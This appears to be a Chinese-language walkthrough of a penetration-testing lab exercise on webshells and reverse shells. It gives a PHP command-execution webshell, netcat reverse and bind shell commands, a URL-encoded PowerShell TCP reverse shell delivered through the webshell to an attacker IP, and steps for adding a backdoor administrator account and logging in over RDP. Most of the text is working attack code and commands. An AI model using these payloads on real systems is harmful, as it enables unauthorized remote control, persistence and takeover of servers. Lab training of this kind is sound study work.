### webshell

1. 尝试将 Webshel​​l 上传到Linux机器，然后使用以下命令：nc <LOCAL-IP> <PORT> -e /bin/bash将反向 shell 发送回您自己计算机上等待的侦听器。

  - `nc -nlvp 1234`
  - 创建php文件 webshell.php
      ```php 
      <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
        ?>
      ```
   - 打开被攻击的网址`http://10.10.57.248/`,上传webshell.php
   - 构建url `http://10.10.57.248/uploads/webshell.php?cmd=nc 10.10.21.196 1234 -e /bin/bash`,后面的参数ip为你本地的ip端口为你nc监听的端口(简单说这一步就是访问你刚才上传的文件并传入命令执行)。
   - 然后查看nc 看到连接成功

2. 导航到/usr/share/webshells/php/php-reverse-shell.phpKali 并更改 IP 和端口，以将您的 tun0 IP 与自定义端口相匹配。设置 netcat 监听器，然后上传并激活 shell。
  - 连接ssh `ssh shell@10.10.149.6`
  - 执行 `mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
  - 执行 `nc 10.10.149.6 4444` 此处的ip是目标机的ip
  - 成功  

3. 在 Windows 目标上上传 Webshel​​l 并尝试使用 Powershell 获取反向 shell。
  - `nc -nlvp 1234`
  - 创建php文件 webshell.php
      ```php 
      <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
        ?>
      ```
   - 打开被攻击的网址`http://10.10.57.248/`,上传webshell.php
   - 构建url `http://10.10.57.248/uploads/webshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.194.117%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`,后面的参数ip为你本地的ip端口为你nc监听的端口(简单说这一步就是访问你刚才上传的文件并传入命令执行)。
   - 然后查看nc 看到连接成功

4. 网络服务器正在以系统权限运行。创建一个新用户并将其添加到“管理员”组，然后通过 RDP 或 WinRM 登录。
  - 使用刚才获取的shell
  - `net user test test123 /add`               #添加新用户
    `net localgroup administrators test /add`  #添加用户到管理员组  
  - 使用新用户登录 `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.91.116 /u:test /p:'test123'`

5. 要求：尝试使用 socat 和 netcat 在 Windows 目标上获得反向和绑定 shell。